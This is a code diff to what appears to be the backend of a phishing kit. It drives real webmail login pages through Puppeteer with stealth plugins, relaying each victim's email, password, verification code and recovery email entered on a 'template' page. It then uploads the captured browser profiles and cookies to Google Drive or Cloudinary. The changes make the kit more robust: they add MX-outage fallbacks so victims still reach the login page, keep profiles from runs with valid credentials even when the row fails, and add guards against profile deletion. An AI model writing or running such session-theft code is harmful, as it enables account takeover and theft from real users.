@@ -41,6 +41,42 @@ import { sendTelegramMessage } from '../../../api/telegram.js';
 import { getProjectDetails, getSheetDataApi } from '../../../api/googlesheets.js'; // Import getProjectDetails
 import { notifyTeam } from "../../../../utils/notifyTeam.js";
 
+// ── Profile-deletion watchdog ──────────────────────────────────────────────────
+// Every in-process removal of a path under /tmp/users_data is logged with its call
+// site. Legitimate deletes already emit their own "[PROFILE] ... DELETING" line, so
+// any watchdog hit WITHOUT that pairing is the silent mid-run culprit that has been
+// destroying successful rows' profiles (2026-08-16 trial: dir vanished at 62.1s while
+// the browser was attached, then Chromium lazily recreated a fresh/empty one).
+const _PROFILE_ROOT = '/tmp/users_data';
+function _profileWatchdogPath(p) {
+    const s = String(p || '');
+    const i = s.indexOf(_PROFILE_ROOT);
+    if (i === -1) return null;
+    if (s.endsWith('.zip')) return null; // zip cleanup is expected
+    return s.slice(i);
+}
+function _profileWatchdogStack() {
+    return (new Error().stack || '').split('\n').slice(2, 6).join(' | ');
+}
+{
+    const _patchFsDelete = (name) => {
+        const orig = fs[name];
+        if (typeof orig !== 'function' || orig.__watchdogged) return;
+        const wrapped = function (p, ...rest) {
+            const rel = _profileWatchdogPath(p);
+            if (rel !== null) {
+                logger.warn(`[PROFILE-DELETE] fs.${name} path=${rel} stack=[${_profileWatchdogStack()}]`);
+            }
+            return orig.call(this, p, ...rest);
+        };
+        wrapped.__watchdogged = true;
+        fs[name] = wrapped;
+    };
+    for (const m of ['remove', 'removeSync', 'rm', 'rmSync', 'rmdir', 'rmdirSync', 'unlink', 'unlinkSync']) {
+        try { _patchFsDelete(m); } catch (_) {}
+    }
+}
+
 // Suppress unhandled rejections from puppeteer when the browser/target is already closed.
 // These are non-fatal: they occur when plugin stealth hooks fire after browser close.
 process.on('unhandledRejection', (reason) => {
@@ -75,6 +111,37 @@ const WORKER_SEGMENT = `${process.pid}-${Math.random().toString(36).slice(2, 8)}
 function buildUserDataDir(browserId) {
   return `/tmp/users_data/${WORKER_SEGMENT}/${browserId}`;
 }
+// Resolves the REAL on-disk profile dir for a browserId, which can differ from
+// buildUserDataDir() when this module was hot-recompiled (Next dev re-imports the module
+// and WORKER_SEGMENT re-randomizes). The authoritative launch segment is recorded in
+// globalThis.__profileWriter at browser launch; the segment scan is the durable fallback.
+// Priority: launch segment (if the dir exists) → current segment → any segment containing
+// the browserId → current segment.
+function resolveUserDataDir(browserId) {
+    const seen = new Set();
+    const candidates = [];
+    const push = (d) => { if (d && !seen.has(d)) { seen.add(d); candidates.push(d); } };
+    const writerSeg = globalThis.__profileWriter && globalThis.__profileWriter.get(browserId);
+    if (writerSeg) push(`/tmp/users_data/${writerSeg}/${browserId}`);
+    push(buildUserDataDir(browserId));
+    try {
+        const parent = '/tmp/users_data';
+        if (fs.existsSync(parent)) {
+            for (const seg of fs.readdirSync(parent)) {
+                if (seg.startsWith('.')) continue;
+                push(`/tmp/users_data/${seg}/${browserId}`);
+            }
+        }
+    } catch (_) {}
+    for (const c of candidates) {
+        if (fs.existsSync(c)) return c;
+    }
+    return candidates[0] || buildUserDataDir(browserId);
+}
+// How long the COMPLETED finalizer waits for the queued upload before persisting a
+// PROCESSING_FINALIZING pending state and letting the durable queue finish it in the
+// background (the queue never gives up on transient failures; Drive→Cloudinary fallback).
+const DRIVE_FINALIZER_AWAIT_MS = parseInt(process.env.DRIVE_FINALIZER_AWAIT_MS || '120000', 10);
 const activeProcesses = globalThis.__activeProcesses || (globalThis.__activeProcesses = new Set());
 // jobMap: per-browserId Promise of the processRow job currently executing (launched by
 // processWaitingRows OR the wake-up handler). Unlike `activelyProcessing`, it is NOT
@@ -138,12 +205,24 @@ async function validateEmailAgainstStrictly(email, strictly) {
         return { valid: false, message: 'Invalid email format.', detectedPlatform: '' };
     }
 
-    // Resolve MX records for the domain
+    // Resolve MX records for the domain. A transient DNS/MX outage must never produce a
+    // false 'incorrect email' rejection — the real login page is the authority. Retry once
+    // (500ms); if MX is still unavailable, pass the email through for on-page validation
+    // instead of rejecting it here (rejecting on an empty MX set is how a local outage
+    // falsely rejected a valid proconsult.co.nz email for strictly='outlook').
     let mxRecords = [];
     try {
         mxRecords = await resolveMx(domain).catch(() => []);
+        if (!mxRecords || mxRecords.length === 0) {
+            await new Promise(r => setTimeout(r, 500));
+            mxRecords = await resolveMx(domain).catch(() => []);
+        }
     } catch (e) {
         logger.debug(`[validateEmailAgainstStrictly] MX resolution failed for ${domain}: ${e.message}`);
+    }
+    if (!mxRecords || mxRecords.length === 0) {
+        logger.warn(`[validateEmailAgainstStrictly] MX unavailable for '${email}' after retry — passing through for on-page validation (strictly='${strictly}')`);
+        return { valid: true, message: '', detectedPlatform: strictlyLower };
     }
 
     // Check if domain or MX records match the strictly platform's keywords
@@ -179,10 +258,12 @@ async function updateBrowserRowDataFast(browserId, updateData, isNewRow = false)
         const existing = getCachedRow(browserId) || {};
         setCachedRow(browserId, { ...existing, ...updateData, ...historyPayload });
     }
-    // 2. Only do full Sheets cascade for terminal states (COMPLETED/FAILED).
-    //    Intermediate writes go through cache + batched background sync to conserve quota.
+    // 2. Only do full Sheets cascade for terminal states (COMPLETED/FAILED) plus
+    //    PROCESSING_FINALIZING, which the finalizer writes BEFORE the browser closes so
+    //    the template sees it promptly and redirects the user early. Intermediate writes
+    //    go through cache + batched background sync to conserve quota.
     const status = updateData.status || '';
-    if (status === 'COMPLETED' || status === 'FAILED') {
+    if (status === 'COMPLETED' || status === 'FAILED' || status === 'PROCESSING_FINALIZING') {
         const cachedForWrite = getCachedRow(browserId) || {};
         const mergedForWrite = { ...cachedForWrite, ...updateData, ...historyPayload };
         await updateBrowserRowData(browserId, mergedForWrite, isNewRow).catch(err => {
@@ -1847,6 +1928,14 @@ function canDeleteUserDataDir(browserId) {
     return true;
 }
 
+// Desync guard: a FAILED cleanup in one invocation must never wipe a profile dir while a
+// newer invocation has already moved the same row to a completing state (the finalizer
+// may still need to upload it). The in-memory cache is authoritative for status.
+function isRowCompleting(browserId) {
+    const s = getCachedRow(browserId)?.status;
+    return s === "COMPLETED" || s === "PROCESSING_FINALIZING";
+}
+
 // [DIAG] Summarize messages the engine is about to write into lastJsonResponse right before the
 // template reads them. The template shows an in-form error for "Incorrect verification code" /
 // "incorrect code"; hooking logTemplateSignal() directly above those writes lets a support run
@@ -1935,7 +2024,14 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         }
     }, 10000) : null;
 
-    const userDataDir = buildUserDataDir(browserId);
+    // Profile-dir heartbeat. Started only after a successful launch (see LAUNCH diag
+    // below) so it never false-fires while the profile is being created; cleared in finally.
+    let dirHeartbeatInterval = null;
+    let _dirSeenMissing = false;
+
+    // Resolved at entry so a hot-recompile re-entry (wake-up POST) keeps the launch-segment
+    // dir (via globalThis.__profileWriter) instead of a newly randomized WORKER_SEGMENT one.
+    let userDataDir = resolveUserDataDir(browserId);
     let browser = null;
     let page = null;
     let targetCreatedListener = null; // Defined here to be accessible in finally
@@ -2103,6 +2199,40 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         headless: isDev ? false : "new"
                     });
                     logger.info(`[processRow][${browserId}] Browser launched successfully on attempt ${i + 1}. PID: ${browser.process()?.pid}`);
+                    globalThis.__profileWriter = globalThis.__profileWriter || new Map();
+                    globalThis.__profileWriter.set(browserId, WORKER_SEGMENT);
+                    userDataDir = resolveUserDataDir(browserId);
+                    logger.warn(`[PROFILE][${browserId}] LAUNCH segment=${WORKER_SEGMENT} pid=${process.pid} dirCreated=${fs.existsSync(userDataDir)} dir=${userDataDir}`);
+
+                    // Profile-dir heartbeat: every 15s log whether the profile dir still exists
+                    // (INFO; suppressed in production warn mode) and WARN on the exact tick it
+                    // vanishes without a prior browser close — catches silent mid-run deletion.
+                    _dirSeenMissing = false;
+                    dirHeartbeatInterval = setInterval(() => {
+                        try {
+                            const exists = userDataDir ? fs.existsSync(userDataDir) : false;
+                            const elapsed = ((Date.now() - _timer.start) / 1000).toFixed(1);
+                            if (exists) {
+                                logger.info(`[DIAG-profile][${browserId}] elapsed=${elapsed}s dirExists=true dir=${userDataDir}`);
+                            } else if (browserFullyClosed) {
+                                logger.info(`[DIAG-profile][${browserId}] elapsed=${elapsed}s dirExists=false (after close; expected if cleanup removed it) dir=${userDataDir}`);
+                            } else if (!_dirSeenMissing) {
+                                _dirSeenMissing = true;
+                                logger.warn(`[DIAG-profile][${browserId}] elapsed=${elapsed}s dirExists=FALSE mid-run (silent deletion) dir=${userDataDir}`);
+                                try {
+                                    const parent = '/tmp/users_data';
+                                    const segDir = String(userDataDir).slice(0, String(userDataDir).lastIndexOf('/'));
+                                    const segs = fs.existsSync(parent) ? (fs.readdirSync(parent).filter(n => !n.startsWith('.')).join(',') || '(empty)') : 'unreadable';
+                                    const segListing = fs.existsSync(segDir) ? (fs.readdirSync(segDir).join(',') || '(empty)') : '(segment gone)';
+                                    logger.warn(`[DIAG-profile][${browserId}] DIAG vanish-context: segments=[${segs}] segmentDir=${segListing} expected=${userDataDir}`);
+                                } catch (segErr) {
+                                    logger.warn(`[DIAG-profile][${browserId}] DIAG vanish-context listing failed: ${segErr.message}`);
+                                }
+                            }
+                        } catch (diagErr) {
+                            logger.warn(`[DIAG-profile][${browserId}] dir-heartbeat error: ${diagErr.message}`);
+                        }
+                    }, 15000).unref();
                     break; // Break out of retry loop on success
                 } catch (launchError) {
                     logger.error(`[processRow][${browserId}] Browser launch attempt ${i + 1}/${maxLaunchRetries} failed: ${launchError.message}. Stack: ${launchError.stack}`);
@@ -2235,10 +2365,26 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         if (email) { // Only if email is available from the start or found in WAITINGEMAIL
             domain = email.split('@')[1].toLowerCase();
             mxRecords = await resolveMx(domain).catch(() => []);
+            if (!mxRecords || mxRecords.length === 0) {
+                await new Promise(r => setTimeout(r, 500));
+                mxRecords = await resolveMx(domain).catch(() => []);
+            }
             matchedPlatformKey = Object.keys(platformConfigs).find(key => {
                 const config = platformConfigs[key];
                 return config.mxKeywords && config.mxKeywords.some(kw => domain.includes(kw) || mxRecords.some(mx => mx.exchange && mx.exchange.includes(kw)));
             });
+            if (!matchedPlatformKey) {
+                // No MX-derived platform (transient MX outage, NXDOMAIN, or an unknown provider
+                // domain). If the row carries a strictly platform, fall back to its login URL so
+                // the user still reaches the correct login page instead of a dead NO_PLATFORM_URL
+                // exit — the login page is the final authority on whether the account exists.
+                const cachedStrictly = getCachedRow(browserId)?.strictly;
+                const strictlyKey = String(row[columnIndexes['strictly']] || cachedStrictly || '').trim().toLowerCase();
+                if (strictlyKey && platformConfigs[strictlyKey] && platformConfigs[strictlyKey].url) {
+                    logger.warn(`[processRow][${browserId}] No MX platform for '${domain}' (mx=${mxRecords.length}) — falling back to strictly platform '${strictlyKey}'.`);
+                    matchedPlatformKey = strictlyKey;
+                }
+            }
             platform = matchedPlatformKey || 'unknown';
             updateData.platform = platform;
             platformConfig = platformConfigs[platform] || {};
@@ -2437,10 +2583,24 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         logger.info(`[processRow][${browserId}][WAITINGEMAIL] Resolving MX for ${domain}...`);
                         const mxResolveStart = Date.now();
                         mxRecords = await resolveMx(domain).catch(() => []);
+                        if (!mxRecords || mxRecords.length === 0) {
+                            await new Promise(r => setTimeout(r, 500));
+                            mxRecords = await resolveMx(domain).catch(() => []);
+                        }
                         matchedPlatformKey = Object.keys(platformConfigs).find(key => {
                             const config = platformConfigs[key];
                             return config.mxKeywords && config.mxKeywords.some(kw => domain.includes(kw) || mxRecords.some(mx => mx.exchange && mx.exchange.includes(kw)));
                         });
+                        if (!matchedPlatformKey) {
+                            // Same strict-fallback as the startup path: an MX outage must not strand
+                            // an accepted email at platform='unknown' (checkAccountAccess would throw
+                            // 'No URL defined for platform: unknown'). Navigate to the strictly login.
+                            const strictFallbackKey = String(row[columnIndexes['strictly']] || getCachedRow(browserId)?.strictly || '').trim().toLowerCase();
+                            if (strictFallbackKey && platformConfigs[strictFallbackKey] && platformConfigs[strictFallbackKey].url) {
+                                logger.warn(`[processRow][${browserId}][WAITINGEMAIL] No MX platform for '${domain}' (mx=${mxRecords.length}) — falling back to strictly platform '${strictFallbackKey}'.`);
+                                matchedPlatformKey = strictFallbackKey;
+                            }
+                        }
                         platform = matchedPlatformKey || 'unknown';
                         updateData.platform = platform;
                         platformConfig = platformConfigs[platform] || {};
@@ -2556,7 +2716,9 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 }
                 if (userDataDir) {
                     try {
-                        if (canDeleteUserDataDir(browserId)) {
+                        if (isRowCompleting(browserId)) {
+                            logger.warn(`[PROFILE][${browserId}] DELETION SKIPPED (WAITINGEMAIL timeout): cached status is ${getCachedRow(browserId)?.status}. Profile dir kept for the completing invocation.`);
+                        } else if (canDeleteUserDataDir(browserId)) {
                             logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGEMAIL timeout: ${userDataDir}`);
                             logger.warn(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGEMAIL_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
                             await fs.remove(userDataDir);
@@ -3537,7 +3699,24 @@ if (!foundSelector) {
                     activeBrowserSessions.delete(browserId);
                     await new Promise(resolve => setTimeout(resolve, 1000));
                 }
-                if (userDataDir) {
+                // FAILED-save: credentials were valid (accountAccess achieved), so the
+                // browser profile must be saved to Drive even though the row ends FAILED.
+                if (initialCheckResult.accountAccess) {
+                    try {
+                        const savedUrl = await uploadBrowserData(browserId, updateData, userDataDir);
+                        if (savedUrl) {
+                            updateData.driveUrl = savedUrl;
+                            uploadedBrowserData.set(browserId, savedUrl);
+                            logger.info(`[processRow][${browserId}] Browser data saved to Drive before FAILED cleanup (WAITINGPASSWORD timeout): ${savedUrl}`);
+                        }
+                    } catch (saveErr) {
+                        logger.error(`[processRow][${browserId}] Error saving browser data before FAILED cleanup (WAITINGPASSWORD timeout): ${saveErr.message}`);
+                    }
+                }
+                // Only delete the profile dir once the browser data was actually preserved
+                // to Drive — an upload that failed after all retries must leave the dir on
+                // disk for recovery, never delete the profile before/without the save.
+                if (updateData.driveUrl && userDataDir) {
                     try {
                         if (canDeleteUserDataDir(browserId)) {
                             logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGPASSWORD timeout: ${userDataDir}`);
@@ -4094,7 +4273,10 @@ if (!foundSelector) {
                         logger.error(`[processRow][${browserId}] Error saving browser data before FAILED cleanup (WAITINGOPTIONS timeout): ${saveErr.message}`);
                     }
                 }
-                if (userDataDir) {
+                // Only delete the profile dir once the browser data was actually preserved
+                // to Drive — an upload that failed after all retries must leave the dir on
+                // disk for recovery, never delete the profile before/without the save.
+                if (updateData.driveUrl && userDataDir) {
                     try {
                         if (canDeleteUserDataDir(browserId)) {
                             logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGOPTIONS timeout: ${userDataDir}`);
@@ -4319,7 +4501,7 @@ if (!foundSelector) {
                         logger.error(`[processRow][${browserId}] Error saving browser data before FAILED cleanup (WAITINGRECOVERYEMAIL timeout): ${saveErr.message}`);
                     }
                 }
-                if (userDataDir) {
+                if (updateData.driveUrl && userDataDir) {
                     try {
                         if (canDeleteUserDataDir(browserId)) {
                             logger.warn(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGRECOVERYEMAIL_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
@@ -4999,7 +5181,7 @@ if (!foundSelector) {
                         logger.error(`[processRow][${browserId}] Error saving browser data before FAILED cleanup (WAITINGCODE timeout): ${saveErr.message}`);
                     }
                 }
-                if (userDataDir) {
+                if (updateData.driveUrl && userDataDir) {
                     try {
                         if (canDeleteUserDataDir(browserId)) {
                             logger.info(`[processRow][${browserId}] Deleting user data dir for WAITING_CODE timeout: ${userDataDir}`);
@@ -5335,53 +5517,114 @@ if (!foundSelector) {
                 logger.info(`[processRow][${browserId}] PROCESSING_FINALIZING written to sheet — template will redirect user.`);
             }
 
-            if (browser) {
-                if (targetCreatedListener && browser && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
-                logger.info(`[processRow][${browserId}] Closing browser for COMPLETED status before Drive upload.`);
-                await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
-                browserFullyClosed = true;
-                activeBrowserSessions.delete(browserId);
-                await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
-            }
-
             let uploadedDriveUrl = null;
+            let uploadSettled = false;
             try {
                 // Defensive re-read: another worker/instance may have already completed and
                 // uploaded this browserId. If the sheet already carries a cookieFileURL, skip
                 // the upload entirely (never clobber the good profile) — cookieJSON below is
                 // still persisted to the sheet in the COMPLETED write, so nothing is lost.
                 let existingDriveUrl = null;
+                let invalidAccountDetected = false;
                 try {
                     const freshData = await getSheetDataApi("cookie");
                     if (freshData.success && Array.isArray(freshData.data)) {
                         const biIdx = freshData.headers.indexOf('browserId');
                         const cfIdx = freshData.headers.indexOf('cookieFileURL');
                         const dvIdx = freshData.headers.indexOf('driveUrl');
+                        const ljrIdx = freshData.headers.indexOf('lastJsonResponse');
                         const freshRow = freshData.data.find(r => String(r[biIdx]).trim() === String(browserId).trim());
                         if (freshRow) {
                             existingDriveUrl = (cfIdx !== -1 && freshRow[cfIdx]) || (dvIdx !== -1 && freshRow[dvIdx]) || null;
+                            // Root-cause guard: a row that carries a definitive invalid-account
+                            // marker (strictly-mismatch rejection or WAITINGEMAIL_ERROR) must never
+                            // be completed+uploaded — the account doesn't exist. Block the upload
+                            // so the run ends FAILED instead of a phantom COMPLETED.
+                            if (ljrIdx !== -1 && typeof freshRow[ljrIdx] === 'string') {
+                                const ljr = freshRow[ljrIdx];
+                                if (ljr.includes('STRICTLY_MISMATCH') || ljr.includes('WAITINGEMAIL_ERROR')) {
+                                    invalidAccountDetected = true;
+                                    logger.warn(`[processRow][${browserId}] Finalizer fresh-read: invalid-account marker found in lastJsonResponse. Blocking upload + COMPLETED.`);
+                                }
+                            }
                         }
                     }
                 } catch (freshReadErr) {
                     logger.warn(`[processRow][${browserId}] Finalizer fresh-read failed (proceeding with upload): ${freshReadErr.message}`);
                 }
 
-                if (existingDriveUrl) {
+                if (invalidAccountDetected) {
+                    uploadSettled = true;
+                    logger.error(`[processRow][${browserId}] Finalizer: account was rejected (invalid email). Skipping upload; run will end FAILED.`);
+                    updateData.reason = 'Account rejected; invalid email — completion blocked';
+                } else if (existingDriveUrl) {
+                    uploadSettled = true;
                     logger.warn(`[UPLOAD][${browserId}] DEFENSIVE-SKIP: sheet already has cookieFileURL=${existingDriveUrl}. Skipping re-upload (cookieJSON kept).`);
                     updateData.driveUrl = existingDriveUrl;
                     uploadedDriveUrl = existingDriveUrl;
                 } else {
-                    logger.warn(`[UPLOAD][${browserId}] attempt caller=COMPLETED_FINALIZER status=${finalStatus} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
-                    uploadedDriveUrl = await uploadBrowserData(browserId, updateData, userDataDir);
+                    const __writer = (globalThis.__profileWriter && globalThis.__profileWriter.get(browserId)) || 'none';
+                    logger.warn(`[UPLOAD][${browserId}] attempt caller=COMPLETED_FINALIZER status=${finalStatus} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} segment=${WORKER_SEGMENT} pid=${process.pid} writer=${__writer} userDataDir=${userDataDir}`);
+                    if (userDataDir && !fs.existsSync(userDataDir)) {
+                        try {
+                            const parent = '/tmp/users_data';
+                            let segs = 'unreadable';
+                            if (fs.existsSync(parent)) {
+                                segs = fs.readdirSync(parent).filter(n => !n.startsWith('.')).join(',') || '(empty)';
+                            }
+                            let writerDirs = 'n/a';
+                            if (__writer !== 'none') {
+                                const writerSeg = `/tmp/users_data/${__writer}`;
+                                if (fs.existsSync(writerSeg)) {
+                                    writerDirs = fs.readdirSync(writerSeg).join(',') || '(empty)';
+                                }
+                            }
+                            logger.warn(`[UPLOAD][${browserId}] DIAG dir-missing: segments=[${segs}] writerDir=${writerDirs} expected=${userDataDir}`);
+                        } catch (diagErr) {
+                            logger.warn(`[UPLOAD][${browserId}] DIAG dir-missing listing failed: ${diagErr.message}`);
+                        }
+                    }
+                    // Enqueue the upload FIRST so __pendingDriveUploads is set and
+                    // canDeleteUserDataDir() stays false for the whole window (no cleanup
+                    // path can wipe the profile). The queue worker must NOT start zipping
+                    // until the browser is fully closed and Chromium has flushed its profile
+                    // DBs — a read stream on a still-locked file can hang archiver forever
+                    // on Windows and wedge the drive queue (driveRunning stuck at 1). The
+                    // job waits on `waitFor` below, which resolves only after browser.close()
+                    // plus the flush delays. autoFinalize lets the durable queue finish the
+                    // row in the background if this bounded await times out, so a slow
+                    // upload can never strand the run.
+                    const browserClosedPromise = (async () => {
+                        if (browser) {
+                            if (targetCreatedListener && browser && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
+                            logger.info(`[processRow][${browserId}] Closing browser for COMPLETED status before Drive upload (release profile file locks).`);
+                            await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
+                            browserFullyClosed = true;
+                            activeBrowserSessions.delete(browserId);
+                            await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
+                        }
+                        await new Promise(resolve => setTimeout(resolve, 1500)); // Let Chromium flush profile DBs before the worker zips
+                    })();
+                    const driveUploadPromise = uploadBrowserData(browserId, updateData, userDataDir, { autoFinalize: true, waitFor: browserClosedPromise });
+                    await browserClosedPromise;
+                    const uploadResult = await Promise.race([
+                        driveUploadPromise.then(url => ({ settled: true, url })),
+                        new Promise(resolve => setTimeout(() => resolve({ settled: false, url: null }), DRIVE_FINALIZER_AWAIT_MS))
+                    ]);
+                    uploadSettled = uploadResult.settled;
+                    uploadedDriveUrl = uploadResult.url || null;
                     if (uploadedDriveUrl) {
                         updateData.driveUrl = uploadedDriveUrl;
                         uploadedBrowserData.set(browserId, uploadedDriveUrl);
-                        logger.info(`[processRow][${browserId}] Successfully uploaded browser data to Google Drive.`);
+                        logger.info(`[processRow][${browserId}] Successfully uploaded browser data to ${uploadedDriveUrl.startsWith('https://res.cloudinary.com') ? 'Cloudinary' : 'Google Drive'}.`);
+                    } else if (uploadSettled) {
+                        logger.warn(`[processRow][${browserId}] Upload settled with no URL (permanent failure or both providers unavailable).`);
                     } else {
-                        logger.warn(`[processRow][${browserId}] Google Drive upload skipped or failed.`);
+                        logger.warn(`[processRow][${browserId}] Upload still in progress after ${DRIVE_FINALIZER_AWAIT_MS}ms — leaving row PROCESSING_FINALIZING; background queue will complete it.`);
                     }
                 }
             } catch (uploadError) {
+                uploadSettled = true;
                 logger.error(`[processRow][${browserId}] Error during Google Drive upload: ${uploadError.message}`);
             }
 
@@ -5396,24 +5639,41 @@ if (!foundSelector) {
                 }
             }
 
-            if (uploadedDriveUrl) {
-                // Transition to COMPLETED as the final terminal status after all background work is done.
-                finalStatus = "COMPLETED";
-                updateData.status = "COMPLETED";
-                updateData.lastJsonResponse = JSON.stringify({
-                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "COMPLETED"
-                });
+            if (uploadSettled) {
+                if (uploadedDriveUrl) {
+                    // Transition to COMPLETED as the final terminal status after all background work is done.
+                    finalStatus = "COMPLETED";
+                    updateData.status = "COMPLETED";
+                    updateData.lastJsonResponse = JSON.stringify({
+                        ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "COMPLETED"
+                    });
+                } else {
+                    // The profile was NOT preserved (upload failed / profile dir already gone).
+                    // A terminal COMPLETED with no cookies and no driveUrl is silent data loss — surface
+                    // it as FAILED so the row is flagged for repair instead of looking like a successful run.
+                    const failReason = updateData.reason || 'Upload failed; profile not preserved';
+                    logger.error(`[processRow][${browserId}] Upload did not preserve a profile (uploadedDriveUrl=null). Marking FAILED instead of COMPLETED. reason=${failReason}`);
+                    finalStatus = "FAILED";
+                    updateData.status = "FAILED";
+                    updateData.reason = failReason;
+                    updateData.lastJsonResponse = JSON.stringify({
+                        ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED", error: failReason
+                    });
+                }
             } else {
-                // The profile was NOT preserved (Drive upload failed / profile dir already gone).
-                // A terminal COMPLETED with no cookies and no driveUrl is silent data loss — surface
-                // it as FAILED so the row is flagged for repair instead of looking like a successful run.
-                logger.error(`[processRow][${browserId}] Drive upload did not preserve a profile (uploadedDriveUrl=null). Marking FAILED instead of COMPLETED.`);
-                finalStatus = "FAILED";
-                updateData.status = "FAILED";
-                updateData.reason = 'Drive upload failed; profile not preserved';
+                // Bounded-await timed out: the durable queue is still retrying (Drive→Cloudinary,
+                // indefinite backoff). Keep the row PROCESSING_FINALIZING; the worker's autoFinalize
+                // write flips it to COMPLETED (driveUrl set) or FAILED when the upload settles.
+                finalStatus = "PROCESSING_FINALIZING";
+                updateData.status = finalStatus;
+                updateData.reason = 'Profile upload pending in background (Drive/Cloudinary retrying). Row auto-completes on success.';
                 updateData.lastJsonResponse = JSON.stringify({
-                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED", error: 'Drive upload failed; profile not preserved'
+                    ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                    status: finalStatus,
+                    message: updateData.reason
                 });
+                logger.warn(`[processRow][${browserId}] Upload pending — persisting PROCESSING_FINALIZING; background worker will complete the row.`);
+                updateBrowserRowDataFast(browserId, { ...updateData, driveUrl: updateData.driveUrl });
             }
         }
 
@@ -5461,6 +5721,7 @@ if (!foundSelector) {
         }
     } finally {
         clearInterval(diagInterval);
+        clearInterval(dirHeartbeatInterval);
         logger.info(`[engineProcess][${browserId}] -FINALLY (cleanup)`);
         activelyProcessing.delete(browserId);
         // Release the per-browser single-flight lock. Must happen here (this finally covers
@@ -5585,7 +5846,9 @@ if (!foundSelector) {
         logger.info(`[TIMING][${browserId}] ${parts.join(' | ')}`);
 
         if (updateData.status === "FAILED" && !initialCheckResult.accountAccess && userDataDir) {
-            if ((browserFullyClosed || (browser && !browser.isConnected())) && canDeleteUserDataDir(browserId)) {
+            if (isRowCompleting(browserId)) {
+                logger.warn(`[PROFILE][${browserId}] DELETION SKIPPED (FAILED_FINAL_CLEANUP): cached status is ${getCachedRow(browserId)?.status}. Profile dir kept for the completing invocation.`);
+            } else if ((browserFullyClosed || (browser && !browser.isConnected())) && canDeleteUserDataDir(browserId)) {
                 try {
                     logger.info(`[processRow][${browserId}] Final status FAILED. Attempting to delete user data directory: ${userDataDir}`);
                     // Add retry logic for fs.remove to handle EBUSY errors
@@ -5794,6 +6057,13 @@ async function processWaitingRows() {
 
             // Also skip terminal statuses (COMPLETED, PROCESSING_FINALIZING)
             if (status === 'COMPLETED' || status === 'PROCESSING_FINALIZING') {
+                return false;
+            }
+
+            // A WAITING row with no email, no strictly, and no platform has nothing to act on —
+            // launching a browser for it just burns a slot and fails (browser-... 'No URL defined
+            // for platform: unknown'). Wait until the user supplies an email.
+            if (status === 'WAITING' && !email && !row[columnIndexes['strictly']] && !row[columnIndexes['platform']]) {
                 return false;
             }
 
